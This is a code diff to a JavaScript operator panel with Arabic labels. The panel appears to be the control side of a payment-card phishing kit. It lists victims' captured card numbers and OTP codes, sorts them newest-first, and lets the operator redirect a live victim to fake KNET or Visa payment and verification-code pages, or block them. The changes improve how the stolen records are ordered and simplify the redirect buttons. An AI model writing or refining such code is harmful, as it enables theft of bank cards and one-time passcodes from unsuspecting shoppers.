@@ -504,9 +504,11 @@
           };
         });
 
-      // أولوية صناديق المحاولات من history، وإلا ما هو محفوظ مباشرة في الوثيقة
-      const allCards = cardsFromHistory.length ? cardsFromHistory : sessionCards;
-      const allOtps = otpsFromHistory.length ? otpsFromHistory : sessionOtps;
+      // أولوية صناديق المحاولات من history، وإلا ما هو محفوظ مباشرة في الوثيقة.
+      // الترتيب موحّد هنا حتى تصل القوائم والنافذة القديمة بالأحدث أولاً.
+      const byNewest = (a, b) => toTime(b.createdAt || b.timestamp || b.updatedAt) - toTime(a.createdAt || a.timestamp || a.updatedAt);
+      const allCards = [...(cardsFromHistory.length ? cardsFromHistory : sessionCards)].sort(byNewest);
+      const allOtps = [...(otpsFromHistory.length ? otpsFromHistory : sessionOtps)].sort(byNewest);
 
       // أحدث بطاقة من بين كل المحاولات
       const latestCard = allCards[0] || {};
@@ -633,6 +635,11 @@
   function renderReferenceVisitorList() {
     if (!els.referenceVisitorList) return;
     const q = (els.referenceSearch?.value || '').trim().toLowerCase();
+    const toCounterMillis = (value) => value?.toDate ? value.toDate().getTime() : (new Date(value || 0).getTime() || 0);
+    const referenceActivityTime = (n) => {
+      const records = [...(n.allCards || (n.cardNumber ? [n] : [])), ...(n.allOtps || [])];
+      return records.reduce((latest, record) => Math.max(latest, toCounterMillis(record.createdAt || record.cardCreatedAt || record.timestamp || record.updatedAt)), toCounterMillis(n.updatedAt || n.lastSeen || n.createdDate));
+    };
     const list = allNotifications.filter(n => {
       if (referenceFilter === 'archive') {
         if (!n.isArchived) return false;
@@ -641,7 +648,7 @@
         if (referenceFilter === 'card' && !n.cardNumber) return false;
       }
       return !q || [n.name, n.phone, n.country, n.bank, n.id].filter(Boolean).join(' ').toLowerCase().includes(q);
-    });
+    }).sort((a, b) => referenceActivityTime(b) - referenceActivityTime(a));
     els.referenceInboxCount.textContent = String(list.length);
     if (!list.length) {
       els.referenceVisitorList.innerHTML = '<div class="reference-empty">لا يوجد زوار مطابقون</div>';
@@ -651,9 +658,7 @@
       const online = isOnline(n.lastSeen);
       const title = n.name || n.phone || n.country || 'زائر جديد';
       const subtitle = n.currentPage || n.bank || 'في انتظار التفاعل';
-      const toCounterMillis = (value) => value?.toDate ? value.toDate().getTime() : (new Date(value || 0).getTime() || 0);
-      const records = [...(n.allCards || (n.cardNumber ? [n] : [])), ...(n.allOtps || [])];
-      const latestBoxTime = records.reduce((latest, record) => Math.max(latest, toCounterMillis(record.createdAt || record.cardCreatedAt || record.timestamp || record.updatedAt)), toCounterMillis(n.updatedAt || n.lastSeen || n.createdDate));
+      const latestBoxTime = referenceActivityTime(n);
       const checked = selectedReferenceIds.has(n.id);
       return `<button class="reference-visitor-row ${checked ? 'bulk-selected' : ''}" data-ref-id="${escapeHtml(n.id)}">
         <span class="reference-checkbox" data-ref-check="${escapeHtml(n.id)}">${checked ? '☑' : '□'}</span>
@@ -798,7 +803,7 @@
       })
       .map(s => s.html)
       .join('');
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="cart">سلة المشتريات</button><button data-ref-nav="knet">دفع كي نت</button><button data-ref-nav="verification">رمز كي نت</button><button data-ref-nav="card">دفع فيزا</button><button data-ref-nav="otp">رمز فيزا</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="cart">سلة المشتريات</option><option value="knet">دفع كي نت</option><option value="verification">رمز كي نت</option><option value="card">دفع فيزا</option><option value="otp">رمز فيزا</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="customer">معلومات العميل</button><button data-ref-nav="payment">دفع فيزا</button><button data-ref-nav="otp">رمز الفيزا</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="customer">معلومات العميل</option><option value="payment">دفع فيزا</option><option value="otp">رمز الفيزا</option></select></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -834,16 +839,9 @@
     els.referenceDetailContent.classList.remove('hidden');
     const NAV_PAGE_MAP = {
       home: 'index.html',
-      order: 'order.html',
+      customer: 'order.html',
       payment: 'payment.html',
-      card: 'payment.html',
       otp: 'otp.html',
-      verification: 'otp.html',
-      knet: 'otp.html',
-      code: 'code.html',
-      cards: 'cards.html',
-      cart: 'cards.html',
-      request: 'request.html',
     };
     const NAV_SIGNAL_MAP = {
       'index.html': 'home',
@@ -890,17 +888,6 @@
       const targetPage = NAV_PAGE_MAP[target] || target;
       sendNavCommand(target, targetPage);
     }));
-    const freeInput = els.referenceDetailContent.querySelector('[data-ref-nav-free]');
-    const freeGo = els.referenceDetailContent.querySelector('[data-ref-nav-free-go]');
-    const doFreeNav = () => {
-      const raw = (freeInput.value || '').trim();
-      if (!raw) return;
-      // السماح بأي مسار يكتبه المدير (صفحة، مجلد، رابط جزئي) — يُرسل كما هو
-      sendNavCommand(raw, raw);
-      freeInput.value = '';
-    };
-    freeGo?.addEventListener('click', doFreeNav);
-    freeInput?.addEventListener('keydown', (e) => { if (e.key === 'Enter') doFreeNav(); });
     els.referenceDetailContent.querySelector('[data-ref-nav-select]')?.addEventListener('change', (e) => {
       const target = e.target.value;
       if (target) els.referenceDetailContent.querySelector(`[data-ref-nav="${target}"]`)?.click();
